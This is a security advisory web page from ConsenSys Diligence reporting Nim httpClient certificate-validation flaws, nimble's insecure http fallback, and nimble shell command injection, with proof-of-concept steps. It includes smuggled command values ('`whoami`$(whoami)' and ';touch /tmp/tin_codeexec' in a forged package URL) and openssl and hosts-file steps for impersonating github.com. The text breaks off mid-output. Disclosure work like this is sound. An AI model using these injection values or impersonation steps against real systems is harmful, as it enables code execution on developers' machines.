@@ -1,0 +1,576 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>Nim - Insecure SSL/TLS Defaults, MitM, and nimble shell command injection | ConsenSys Diligence</title>
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="Vulnerability Note Summary We found a couple of critical security issues in the defaults for one of the standard-lib components that allows peer-impersonation (MitM) on secure transports. This also affects the languages package manager. Additionally, the package manager is vulnerable to shell command injection when fetching remote repositories before installing packages:
+ 2.1 - httpClient does no validate peer certificates by default (appears to be fixed in 1.4.x) 2.2 - the package manager nimble relies on the insecure httpClient defaults (unfixed; latest 0.">
+<link href="/diligence/tachyons.min.css" rel="stylesheet">
+<link href="/diligence/style.css" rel="stylesheet">
+<link href="/diligence/highlight.css" rel="stylesheet">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.10.1/css/all.css" crossorigin="anonymous">
+<link rel="canonical" href="https://consensys.net/diligence/vulnerabilities/nim-insecure-ssl-tls-defaults-remote-code-execution/">
+<link rel="shortcut icon" type="image/png" href="/diligence/images/icon/favicon.png">
+<link rel="nokia-touch-icon" href="/diligence/images/icon/favicon.png">
+<link rel="apple-touch-icon-precomposed" href="/diligence/images/icon/favicon.png" sizes="1x1"><link rel="alternate" type="application/rss+xml" href="https://consensys.net/diligence/index.xml" title="ConsenSys Diligence" />
+<meta itemprop="name" content="Nim - Insecure SSL/TLS Defaults, MitM, and nimble shell command injection">
+<meta itemprop="description" content="Vulnerability Note Summary We found a couple of critical security issues in the defaults for one of the standard-lib components that allows peer-impersonation (MitM) on secure transports. This also affects the languages package manager. Additionally, the package manager is vulnerable to shell command injection when fetching remote repositories before installing packages:
+ 2.1 - httpClient does no validate peer certificates by default (appears to be fixed in 1.4.x) 2.2 - the package manager nimble relies on the insecure httpClient defaults (unfixed; latest 0.">
+<meta itemprop="datePublished" content="2021-02-04T19:13:23&#43;01:00" />
+<meta itemprop="dateModified" content="2021-02-04T19:13:23&#43;01:00" />
+<meta itemprop="wordCount" content="1762">
+<meta itemprop="keywords" content="" />
+<meta property="og:title" content="Nim - Insecure SSL/TLS Defaults, MitM, and nimble shell command injection | ConsenSys Diligence" />
+<meta property="og:description" content="Vulnerability Note Summary We found a couple of critical security issues in the defaults for one of the standard-lib components that allows peer-impersonation (MitM) on secure transports. This also affects the languages package manager. Additionally, the package manager is vulnerable to shell command injection when fetching remote repositories before installing packages:
+ 2.1 - httpClient does no validate peer certificates by default (appears to be fixed in 1.4.x) 2.2 - the package manager nimble relies on the insecure httpClient defaults (unfixed; latest 0." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://consensys.net/diligence/vulnerabilities/nim-insecure-ssl-tls-defaults-remote-code-execution/" />
+<meta property="article:published_time" content="2021-02-04T19:13:23+01:00" />
+<meta property="article:modified_time" content="2021-02-04T19:13:23+01:00" /><meta property="og:site_name" content="ConsenSys Diligence" />
+<meta name="twitter:title" content="Nim - Insecure SSL/TLS Defaults, MitM, and nimble shell command injection | ConsenSys Diligence" />
+<meta name="twitter:description" content="Vulnerability Note Summary We found a couple of critical security issues in the defaults for one of the standard-lib components that allows peer-impersonation (MitM) on secure transports. This also affects the languages package manager. Additionally, the package manager is vulnerable to shell command injection when fetching remote repositories before installing packages:
+ 2.1 - httpClient does no validate peer certificates by default (appears to be fixed in 1.4.x) 2.2 - the package manager nimble relies on the insecure httpClient defaults (unfixed; latest 0." /><meta name="twitter:card" content="summary" />
+<meta name="twitter:site" content="@ConsenSysAudits" />
+<meta name="twitter:creator" content="@ConsenSysAudits" />
+<script type="text/javascript" id="hs-script-loader" async defer src="//js.hs-scripts.com/4795067.js"></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+      'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+      })(window,document,'script','dataLayer','GTM-P5Z4ZWH');</script>
+<script type="text/javascript" id="reload-pathfix">
+        let lastSegment = window.location.pathname.substring(window.location.pathname.lastIndexOf('/') + 1); 
+        if(lastSegment && lastSegment.length !==0 && lastSegment.indexOf(".") === -1){
+          
+          window.location.pathname += "/";  
+        }
+      </script>
+<script async src='/cdn-cgi/bm/cv/669835187/api.js'></script></head>
+<body>
+<header class="header">
+<nav class="db dt-l w-100 border-box pa4 ph5-l deli-nav">
+<a class="db dtc-l v-mid mid-gray link dim w-100 w-25-l tc tl-l mb2 mb0-l dili-logo" href="/diligence" title="Home">
+<img class="logo " src="/diligence/images/logo/logo.svg" alt="ConsenSys Diligence">
+</a>
+<div class="dili_menu_hambuger"></div>
+<div class="db dtc-l v-mid w-100 w-75-l tc tr-l dili-header-menu">
+<div class="dili-header-menu-inner">
+<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/audits/" title="Audits">Audits</a>
+<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/fuzzing/" title="Fuzzing">Fuzzing</a>
+<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/scribble/" title="Scribble">Scribble</a>
+<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/blog/" title="Blog">Blog</a>
+<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/tools/" title="Tools">Tools</a>
+<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/research/" title="Research">Research</a>
+<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/about/" title="About">About</a>
+<a class="link dim light-gray f6 f5-l dib" href="/diligence/contact/" title="Contact">Contact</a>
+</div>
+</div>
+</nav>
+<script type="text/javascript" style="display:none">
+//<![CDATA[
+window.__mirage2 = {petok:"9abf80104cf7b15cfc764d3f71c0b8df03e3feb8-1635633251-1800"};
+//]]>
+</script>
+<script type="text/javascript" src="https://ajax.cloudflare.com/cdn-cgi/scripts/04b3eb47/cloudflare-static/mirage2.min.js"></script>
+<img class="printlogo" alt="ConsenSys Diligence" data-cfsrc="/diligence/print-logo.png" style="display:none;visibility:hidden;"><noscript><img class="printlogo" alt="ConsenSys Diligence" src="/diligence/print-logo.png"></noscript>
+</header>
+<main role="main">
+<div class="dili-navigator-page">
+<div class="dili-blog-hero">
+<div class="dili-hero-bg-mixin" style="background-image: url('/diligence/images/audit_report/feature-hero.png');"></div>
+<div class="dili-container">
+<div class="dili-blog-hero-inner">
+<div class="item-eyebrow"></div>
+<h1 class="item-title">Nim - Insecure SSL/TLS Defaults, MitM, and nimble shell command injection</h1>
+</div>
+</div>
+</div>
+<article class="">
+<div class="dili-navigator-wrapper">
+<div class="dili-navigator-sidebar">
+<ul class="dili-navigator-sidebar-inner">
+<li>
+<a href="#summary">1 Summary</a>
+</li>
+<li>
+<a href="#details">2 Details</a>
+ <ul>
+<li>
+<a href="#httpclient-does-not-validate-peer-certificates-by-default">2.1 <code>httpClient</code> - does not validate peer certificates by default</a>
+</li>
+<li>
+<a href="#nimble-fails-to-validate-certificates-due-to-insecure-httpclient-defaults">2.2 nimble - fails to validate certificates due to insecure <code>httpClient</code> defaults</a>
+</li>
+<li>
+<a href="#nimble-falls-back-to-insecure-http-url-when-fetching-packages">2.3 nimble - falls back to insecure http url when fetching packages</a>
+</li>
+<li>
+<a href="#nimble-arbitrary-code-execution-for-specially-crafted-package-metadata">2.4 nimble arbitrary code execution for specially crafted package metadata</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="#proof-of-concept">3 Proof of Concept</a>
+</li>
+<li>
+<a href="#proposed-fix">4 Proposed Fix</a>
+</li>
+<li>
+<a href="#vendor-response">5 Vendor Response</a>
+<ul>
+<li>
+<a href="#timeline">5.1 Timeline</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="#references">6 References</a>
+</li>
+</ul>
+</div>
+<div class="dili-navigator-content richtext">
+<aside class="summary summary-cta-side">
+<div class="cta-block">
+<div class="item-outer">
+<div class="item-inner">
+<div class="item-title">
+Book your 1-Day Security Spot Check
+</div>
+</div>
+<div class="item-action">
+<a class="btn btn-primary" href="https://pages.consensys.net/diligence-1-day-spot-check" target="_blank">Book Now</a>
+</div>
+</div>
+</div>
+<table>
+<tr>
+<th align="left">CVE</th>
+<td align="left">
+<a class="blue no-underline" href="https://nvd.nist.gov/vuln/detail/CVE-2021-21374">CVE-2021-21374</a>&nbsp;
+<a class="blue no-underline" href="https://nvd.nist.gov/vuln/detail/CVE-2021-21373">CVE-2021-21373</a>&nbsp;
+<a class="blue no-underline" href="https://nvd.nist.gov/vuln/detail/CVE-2021-21372">CVE-2021-21372</a>&nbsp;
+</td>
+</tr>
+<tr>
+<th align="left">Vendor</th>
+<td align="left"><a href="https://nim-lang.org/">nim-lang</a></td>
+</tr>
+<tr>
+<th align="left">Affected Versions</th>
+<td align="left"><= 1.2.6,
+nimble <=v0.12.0</td>
+</tr>
+<tr>
+<th align="left">Vulnerability Class</th>
+<td align="left">CWE-295, CWE-78, CWE-348</td>
+</tr>
+
+<tr>
+<th align="left">Author(s)</th>
+<td align="left">tintinweb</td>
+</tr>
+<tr>
+<th align="left">Date</th>
+<td align="left">Feb 4, 2021</td>
+</tr>
+</table>
+</aside>
+<h1 id="vulnerability-note">Vulnerability Note</h1>
+<h2 id="summary">1 Summary</h2>
+<p>We found a couple of critical security issues in the defaults for one of the standard-lib components that allows peer-impersonation (MitM) on secure transports. This also affects the languages package manager. Additionally, the package manager is vulnerable to shell command injection when fetching remote repositories before installing packages:</p>
+<ul>
+<li>2.1 - <code>httpClient</code> does no validate peer certificates by default (appears to be fixed in 1.4.x)</li>
+<li>2.2 - the package manager <code>nimble</code> relies on the insecure <code>httpClient</code> defaults (unfixed; latest 0.12.0 has not been re-compiled with a fixed nim-c)</li>
+<li>2.3 - <code>nimble</code> falls back to insecure transports if <code>https</code> is blocked (unfixed)</li>
+<li>2.4 - <code>nimble</code> shell command injection when fetching a package for installation (unfixed)</li>
+</ul>
+<p><strong>TLDR;</strong> The Nim (<code>at least &lt;=1.2.6</code>) <code>httpClient</code> default SSL/TLS configuration does not enforce peer certificate verification by default. Non-secure settings should not be the default as this might unexpectedly expose other projects to security risks. If you&rsquo;re using <code>nimble &lt;= 0.12.0</code> anyone can block your TLS session and it will fall back to an insecure transport. Because of the insecure <code>httpClient</code> defaults, one can also just intercept your TLS session as the peer verification is too lax. Additionally, nimble appears to be vulnerable to a direct shell command injection when installing a package (but one can as well just provide a malicious package).</p>
+<h2 id="details">2 Details</h2>
+<h3 id="httpclient-does-not-validate-peer-certificates-by-default">2.1 <code>httpClient</code> - does not validate peer certificates by default</h3>
+<p><strong>Update</strong>: this appears to be fixed with nim 1.4.2. no CVE was provided</p>
+<p>The <code>httpclient</code> - which is part of the nim stdlib - by default sets up an insecure ssl/tls context by specifying <code>verifyMode = CVerifyNone</code> (see <a href="https://github.com/nim-lang/Nim/blob/46aacf917f39d02c96175d358e7a76fc875ea070/lib/pure/httpclient.nim#L323">here</a>). As a result, the library trusts all certificates by default as long as the <code>CN</code>/<code>SAN</code> matches the request host.</p>
+<p>This behavior is completely insecure and unexpected as can be seen with (2.2) where the nim package manager <code>nimble</code> can trivially be intercepted to deliver malicious code or cause code execution on the client.</p>
+<p>Example:</p>
+<p>a) create a self-signed cert for <code>CN=localhost</code></p>
+<pre><code>⇒  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes </code></pre>
+<p>b) start the server <code>openssl s_server -cert cert.pem -key key.pem -www -accept 443</code></p>
+<p>c) connect a default nim <code>httpClient</code> to the local ssl server (self-signed, untrusted)</p>
+<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="kn">import</span> <span class="n">httpClient</span>
+<span class="kd">var</span> <span class="n">client</span> <span class="o">=</span> <span class="n">newHttpClient</span><span class="p">()</span>
+<span class="n">echo</span> <span class="n">client</span><span class="p">.</span><span class="n">getContent</span><span class="p">(</span><span class="s">&#34;https://localhost:443&#34;</span><span class="p">)</span>  <span class="c"># default no certificate check</span></code></pre></div>
+<p>The client successfully accepts the self-signed/untrusted certificate:</p>
+<pre><code>⇒  nim c -r -d:ssl  client_issues.nim                             
+nim c -r -d:ssl  client_issues.nim
+/Users/tintin/workspace/nim/test/config.nims(23, 3) Hint: &#39;pcreIncludeDir&#39; is declared but not used [XDeclaredButNotUsed]
+Hint: used config file &#39;/usr/local/Cellar/nim/1.2.4/nim/config/nim.cfg&#39; [Conf]
+Hint: used config file &#39;/Users/tintin/workspace/nim/test/config.nims&#39; [Conf]
+Hint: 24088 LOC; 0.049 sec; 30.754MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/httpclient/ssl/client_issues.nim; out: /Users/tintin/workspace/nim/test/issues/httpclient/ssl/client_issues [SuccessX]
+Hint: /Users/tintin/workspace/nim/test/issues/httpclient/ssl/client_issues  [Exec]
+&lt;HTML&gt;&lt;BODY BGCOLOR=&#34;#ffffff&#34;&gt;
+&lt;pre&gt;
+
+s_server -cert cert.pem -key key.pem -www -accept 443
+Secure Renegotiation IS supported
+Ciphers supported in s_server binary
+TLSv1/SSLv3:ECDHE-RSA-AES256-GCM-SHA384TLSv1/SSLv3:ECDHE-ECDSA-AES256-GCM-SHA384
+TLSv1/SSLv3:ECDHE-RSA-AES256-SHA384  TLSv1/SSLv3:ECDHE-ECDSA-AES256-SHA384
+TLSv1/SSLv3:ECDHE-RSA-AES256-SHA     TLSv1/SSLv3:ECDHE-ECDSA-AES256-SHA  
+TLSv1/SSLv3:DHE-RSA-AES256-GCM-SHA384TLSv1/SSLv3:DHE-RSA-AES256-SHA256    
+TLSv1/SSLv3:DHE-RSA-AES256-SHA       TLSv1/SSLv3:ECDHE-ECDSA-CHACHA20-POLY1305
+TLSv1/SSLv3:ECDHE-RSA-CHACHA20-POLY1305TLSv1/SSLv3:DHE-RSA-CHACHA20-POLY1305
+TLSv1/SSLv3:GOST2012256-GOST89-GOST89TLSv1/SSLv3:DHE-RSA-CAMELLIA256-SHA256
+TLSv1/SSLv3:DHE-RSA-CAMELLIA256-SHA  TLSv1/SSLv3:GOST2001-GOST89-GOST89  
+TLSv1/SSLv3:AES256-GCM-SHA384        TLSv1/SSLv3:AES256-SHA256            
+TLSv1/SSLv3:AES256-SHA               TLSv1/SSLv3:CAMELLIA256-SHA256      
+TLSv1/SSLv3:CAMELLIA256-SHA          TLSv1/SSLv3:ECDHE-RSA-AES128-GCM-SHA256
+TLSv1/SSLv3:ECDHE-ECDSA-AES128-GCM-SHA256TLSv1/SSLv3:ECDHE-RSA-AES128-SHA256 
+TLSv1/SSLv3:ECDHE-ECDSA-AES128-SHA256TLSv1/SSLv3:ECDHE-RSA-AES128-SHA     
+TLSv1/SSLv3:ECDHE-ECDSA-AES128-SHA   TLSv1/SSLv3:DHE-RSA-AES128-GCM-SHA256
+TLSv1/SSLv3:DHE-RSA-AES128-SHA256    TLSv1/SSLv3:DHE-RSA-AES128-SHA      
+TLSv1/SSLv3:DHE-RSA-CAMELLIA128-SHA256TLSv1/SSLv3:DHE-RSA-CAMELLIA128-SHA  
+TLSv1/SSLv3:AES128-GCM-SHA256        TLSv1/SSLv3:AES128-SHA256           
+TLSv1/SSLv3:AES128-SHA               TLSv1/SSLv3:CAMELLIA128-SHA256       
+TLSv1/SSLv3:CAMELLIA128-SHA          TLSv1/SSLv3:ECDHE-RSA-RC4-SHA       
+TLSv1/SSLv3:ECDHE-ECDSA-RC4-SHA      TLSv1/SSLv3:RC4-SHA                  
+TLSv1/SSLv3:RC4-MD5                  TLSv1/SSLv3:ECDHE-RSA-DES-CBC3-SHA  
+TLSv1/SSLv3:ECDHE-ECDSA-DES-CBC3-SHA TLSv1/SSLv3:EDH-RSA-DES-CBC3-SHA     
+TLSv1/SSLv3:DES-CBC3-SHA            
+---
+Ciphers common between both SSL end points:
+ECDHE-RSA-AES256-GCM-SHA384 ECDHE-ECDSA-AES256-GCM-SHA384 ECDHE-RSA-AES256-SHA384  
+ECDHE-ECDSA-AES256-SHA384  ECDHE-RSA-AES256-SHA       ECDHE-ECDSA-AES256-SHA    
+DHE-RSA-AES256-GCM-SHA384  DHE-RSA-AES256-SHA256      DHE-RSA-AES256-SHA       
+ECDHE-ECDSA-CHACHA20-POLY1305 ECDHE-RSA-CHACHA20-POLY1305 DHE-RSA-CHACHA20-POLY1305 
+GOST2012256-GOST89-GOST89  DHE-RSA-CAMELLIA256-SHA256 DHE-RSA-CAMELLIA256-SHA  
+GOST2001-GOST89-GOST89     AECDH-AES256-SHA           ADH-AES256-GCM-SHA384     
+ADH-AES256-SHA256          ADH-AES256-SHA             ADH-CAMELLIA256-SHA256   
+ADH-CAMELLIA256-SHA        AES256-GCM-SHA384          AES256-SHA256             
+AES256-SHA                 CAMELLIA256-SHA256         CAMELLIA256-SHA          
+ECDHE-RSA-AES128-GCM-SHA256 ECDHE-ECDSA-AES128-GCM-SHA256 ECDHE-RSA-AES128-SHA256   
+ECDHE-ECDSA-AES128-SHA256  ECDHE-RSA-AES128-SHA       ECDHE-ECDSA-AES128-SHA   
+DHE-RSA-AES128-GCM-SHA256  DHE-RSA-AES128-SHA256      DHE-RSA-AES128-SHA        
+DHE-RSA-CAMELLIA128-SHA256 DHE-RSA-CAMELLIA128-SHA    AECDH-AES128-SHA         
+ADH-AES128-GCM-SHA256      ADH-AES128-SHA256          ADH-AES128-SHA            
+ADH-CAMELLIA128-SHA256     ADH-CAMELLIA128-SHA        AES128-GCM-SHA256        
+AES128-SHA256              AES128-SHA                 CAMELLIA128-SHA256        
+CAMELLIA128-SHA            ECDHE-RSA-RC4-SHA          ECDHE-ECDSA-RC4-SHA      
+AECDH-RC4-SHA              ADH-RC4-MD5                RC4-SHA                   
+RC4-MD5                    ECDHE-RSA-DES-CBC3-SHA     ECDHE-ECDSA-DES-CBC3-SHA 
+EDH-RSA-DES-CBC3-SHA       AECDH-DES-CBC3-SHA         ADH-DES-CBC3-SHA          
+DES-CBC3-SHA
+---
+New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
+    Session-ID:
+    Session-ID-ctx: 01000000
+    Master-Key: 78B740AE8469022FB2954B52085CFE9E613E25353DFCDB25DD7A0C6CC9F380DC6414E646ADF780C473998142B52FBA14
+    Start Time: 1594116548
+    Timeout   : 7200 (sec)
+    Verify return code: 0 (ok)
+---
+   0 items in the session cache
+   0 client connects (SSL_connect())
+   0 client renegotiates (SSL_connect())
+   0 client connects that finished
+   1 server accepts (SSL_accept())
+   0 server renegotiates (SSL_accept())
+   1 server accepts that finished
+   0 session cache hits
+   0 session cache misses
+   0 session cache timeouts
+   0 callback cache hits
+   0 cache full overflows (128 allowed)
+---
+no client certificate available
+&lt;/BODY&gt;&lt;/HTML&gt;</code></pre>
+<p>The request succeeds while it should throw a certificate verification error instead.</p>
+<p>It is recommended that the default context is configured with <code>SSL_VERIFY_PEER</code> and let users opt-out of this, to enforce verification of peer certificates by default.</p>
+<h3 id="nimble-fails-to-validate-certificates-due-to-insecure-httpclient-defaults">2.2 nimble - fails to validate certificates due to insecure <code>httpClient</code> defaults</h3>
+<p><strong>Update:</strong> still unfixed. nimble has not been rebuilt with a fixed nim-c. no CVE was provided</p>
+<p>Nimble fetches package metadata from a <code>packages.json</code> hosted on github (main link). The package index is being fetched using the insecure default instance of <code>httpclient</code> (<a href="https://github.com/nim-lang/nimble/blob/6e5761b1923ce213c2b956900591d7a6f50cde84/src/nimblepkg/packageinfo.nim#L178">here</a>) that fails to properly verify certificates when establishing secure transports. Since <code>httpclient</code> only checks <code>CN</code> and <code>SAN</code> to match but does not verify if the certificate is trusted by the host, anyone can trivially intercept the connection and deliver a malicious <code>packages.json</code> in an attempt to install or execute malicious code on a client machine.</p>
+<h3 id="nimble-falls-back-to-insecure-http-url-when-fetching-packages">2.3 nimble - falls back to insecure http url when fetching packages</h3>
+<p><strong>Update:</strong> still unfixed. nimble has not been rebuilt with a fixed nim-c. no CVE was provided</p>
+<p>While intercepting a call to <code>nimble refresh</code> with a spoofed certificate that does not match the url we ran into an <code>SSL Certificate check failed</code> error. When encountering this error nimble falls back to an insecure alternative url: <a href="http://irclogs.nim-lang.org/packages.json">http://irclogs.nim-lang.org/packages.json</a></p>
+<p>This request can trivially be intercepted to cause code execution or deliver malicious packages to the client. It should also be noted that a secure endpoint for <code>packages.json</code> would be available: <a href="https://irclogs.nim-lang.org/packages.json">https://irclogs.nim-lang.org/packages.json</a></p>
+<pre><code>⇒  nimble refresh --debug
+nimble refresh --debug
+Downloading Official package list
+     Trying https://github.com/nim-lang/packages/raw/master/packages.json
+   Warning: Could not download: SSL Certificate check failed.
+     Trying http://irclogs.nim-lang.org/packages.json
+    Success Package list downloaded.
+   Warning: Not removing temporary path because of debug verbosity: /var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_14789</code></pre>
+<p>Note that a man-in-the-middle can trivially force SSL certificate checks to fail in order to downgrade the connection to the insecure <code>http</code> link and modify the <code>package.json</code></p>
+<h3 id="nimble-arbitrary-code-execution-for-specially-crafted-package-metadata">2.4 nimble arbitrary code execution for specially crafted package metadata</h3>
+<p><strong>Update:</strong> still unfixed. nimble has not been rebuilt with a fixed nim-c. no CVE was provided</p>
+<p>Nimbles <code>doCmd</code> and <code>doCmdEx</code> methods rely on <a href="https://nim-lang.org/docs/osproc.html#execCmd%2Cstring">osproc.execCmd</a> which basically works like a call to <code>system(shellcmd)</code>. The command may spawn a shell and allow arbitrary commands to be executed. The command does not take arguments and solely relies on the user to properly shell-escape command from args. This is inherently insecure and shifts the burden of properly sanitizing potential user input to the developer.</p>
+<p><code>doCmd*</code> is called in various places. One of it being <code>checkUrlType(string url)</code> (<a href="https://github.com/nim-lang/nimble/blob/b3abee937dad1012493a195c6c3531693caf8f7c/src/nimblepkg/download.nim#L137">here</a>) which is called by <code>getDownloadInfo()</code> (<a href="https://github.com/nim-lang/nimble/blob/83eb194d9ba20fdfc8d0905acd4bda5c4e19e542/src/nimble.nim#L481">here</a>). <code>checkUrlType</code> takes the <code>url</code> from the package metadata and this <code>url</code> may contain harmful sequences.</p>
+<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="kd">var</span> <span class="n">url</span> <span class="o">=</span> <span class="n">parseUri</span><span class="p">(</span><span class="s">&#34;https://google.com/`whoami`$(whoami);whoami&#34;</span><span class="p">)</span>  <span class="c"># this parses just fine</span></code></pre></div>
+<p>and may end up in one of the many calls to <code>doCmd</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="k">proc </span><span class="nf">checkUrlType</span><span class="o">*</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="kt">string</span><span class="p">):</span> <span class="n">DownloadMethod</span> <span class="o">=</span>
+  <span class="sd">## Determines the download method based on the URL.</span>
+  <span class="k">if</span> <span class="n">doCmdEx</span><span class="p">(</span><span class="s">&#34;git ls-remote &#34;</span> <span class="o">&amp;</span> <span class="n">url</span><span class="p">).</span><span class="n">exitCode</span> <span class="o">==</span> <span class="n">QuitSuccess</span><span class="p">:</span>
+<span class="p">...</span></code></pre></div>
+<p>Here&rsquo;s one PoC to directly execute shell commands:</p>
+<p>1) Intercept client to provide a malicious <code>package.json</code> (similar setup to what is outlined in the Proof of Concept section)</p>
+<p><strong>Note</strong> <code>url</code> has a trailing shell command.</p>
+<pre><code>GET /nim-lang/packages/raw/master/packages.json HTTP/1.1
+Host: github.com
+Connection: Keep-Alive
+content-length: 0
+user-agent: Nim httpclient/1.2.4
+
+HTTP/1.1 200 OK
+Date: Sun, 18 Oct 2012 10:36:20 GMT
+Server: Apache/2.2.14 (Win32)
+Content-Length: 420
+Content-Type: application/json; charset=iso-8859-1
+Connection: Closed
+
+[
+  {
+    &#34;name&#34;: &#34;filesize&#34;,
+    &#34;url&#34;: &#34;https://google.com/;touch /tmp/tin_codeexec&#34;,
+    &#34;method&#34;: &#34;git&#34;,
+    &#34;tags&#34;: [
+      &#34;filesize&#34;,
+      &#34;size&#34;
+    ],
+    &#34;description&#34;: &#34;A Nim package to convert filesizes into other units, and turns filesizes into human readable strings.&#34;,
+    &#34;license&#34;: &#34;MIT&#34;,
+    &#34;web&#34;: &#34;https://github.com/sergiotapia/filesize&#34;,
+    &#34;doc&#34;: &#34;https://github.com/sergiotapia/filesize&#34;
+  }
+]</code></pre>
+<p>2) update package list and install <code>filesize</code> (may affect any command that attempts to download the git repository for that package)</p>
+<pre><code>⇒  nimble refresh --debug
+Downloading Official package list
+     Trying https://github.com/nim-lang/packages/raw/master/packages.json
+    Success Package list downloaded.
+   Warning: Not removing temporary path because of debug verbosity: /var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_530</code></pre>
+<p>install <code>filesize</code> to trigger the vulnerable codepath:</p>
+<pre><code>⇒  nimble install filesize
+Downloading https://google.com/;touch /tmp/tin_codeexec using git
+       Tip: 1 messages have been suppressed, use --verbose to show them.
+     Error: Specified directory (/var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_585/googlecom_touchtmptincodeexec) does not contain a .nimble file.</code></pre>
+<p>command was executed:</p>
+<pre><code>⇒  ls /tmp/tin_codeexec
+/tmp/tin_codeexec</code></pre>
+<p>There&rsquo;s probably other ways this may be insecure as well (path traversal, etc..)</p>
+<h2 id="proof-of-concept">3 Proof of Concept</h2>
+<p>We are going to exploit <a href="https://github.com/nim-lang/nimble">nimble</a> the official nim package manager for this Proof of Concept demonstrating that <code>httpclient</code> fails to properly verify the tls peer certificate silently allowing anyone to impersonate any host.</p>
+<p>Nimble fetches packages from github. This is using the nim-lang stdlib <code>httpclient</code> (<a href="https://github.com/nim-lang/nimble/blob/6e5761b1923ce213c2b956900591d7a6f50cde84/src/nimblepkg/packageinfo.nim#L178">here</a>) that fails to properly verify certificates when establishing secure transports. By default, nimble requests the package list from <code>https://github.com/nim-lang/packages/raw/master/packages.json</code>. Intercepting a call to <code>packages.json</code> may allow an attacker to define what binaries are installed and may also directly lead to code execution on the machine that is executing nimble.</p>
+<ol>
+<li><p>Change your <code>/etc/hosts</code> file to redirect github.com to localhost</p>
+<pre><code>⇒  sudo cat /private/etc/hosts
+127.0.0.1 github.com</code></pre></li>
+<li><p>Create a self-signed certificate for <code>CN=github.com</code></p>
+<pre><code>⇒  openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt</code></pre></li>
+<li><p>run <code>nimble refresh --debug</code> and wait for a connection on the local ssl server.</p></li>
+</ol>
+<p>Output: nimble requesting <code>/nim-lang/packages/raw/master/packages.json</code> after successfully establishing a connection to the fake <code>github.com</code> server.</p>
+<pre><code>⇒  nimble refresh --debug
+nimble refresh --debug
+Downloading Official package list
+     Trying https://github.com/nim-lang/packages/raw/master/packages.json
+    Success Package list downloaded.
+   Warning: Not removing temporary path because of debug verbosity: /var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_16559</code></pre>
+<p>Spoofed github server running on 127.0.0.1:</p>
+<pre><code>⇒  openssl s_server  -cert certificate.crt -key privateKey.key  -accept 443     
+Using auto DH parameters
+Using default temp ECDH parameters
+ACCEPT
+-----BEGIN SSL SESSION PARAMETERS-----
+MGMCAQECAgMDBALAMAQABDAGINA1HSSDBK3NwY+4TQxGDQUsuG4dNw9L3TMybjyP
+grEKxQ5hM5KHvZeJVJjOBBKhBgIEXwRQwaIEAgIcIKQGBAQBAAAApgwECmdpdGh1
+Yi5jb20=
+-----END SSL SESSION PARAMETERS-----
+Shared ciphers:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:GOST2012256-GOST89-GOST89:DHE-RSA-CAMELLIA256-SHA256:DHE-RSA-CAMELLIA256-SHA:GOST2001-GOST89-GOST89:AECDH-AES256-SHA:ADH-AES256-GCM-SHA384:ADH-AES256-SHA256:ADH-AES256-SHA:ADH-CAMELLIA256-SHA256:ADH-CAMELLIA256-SHA:AES256-GCM-SHA384:AES256-SHA256:AES256-SHA:CAMELLIA256-SHA256:CAMELLIA256-SHA:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-CAMELLIA128-SHA256:DHE-RSA-CAMELLIA128-SHA:AECDH-AES128-SHA:ADH-AES128-GCM-SHA256:ADH-AES128-SHA256:ADH-AES128-SHA:ADH-CAMELLIA128-SHA256:ADH-CAMELLIA128-SHA:AES128-GCM-SHA256:AES128-SHA256
+CIPHER is ECDHE-RSA-AES256-GCM-SHA384
+Secure Renegotiation IS supported
